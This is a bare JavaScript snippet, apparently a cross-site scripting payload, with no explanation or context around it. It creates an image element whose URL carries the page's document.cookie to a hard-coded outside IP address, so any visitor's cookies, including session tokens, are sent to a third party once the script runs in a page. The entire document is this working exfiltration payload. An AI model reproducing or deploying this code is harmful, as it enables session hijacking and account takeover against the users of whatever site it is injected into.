var img = document.createElement ("img");
img.src = "http://35.223.225.128/hereisacookie?" + escape(document.cookie);
document.body.appendChild(img);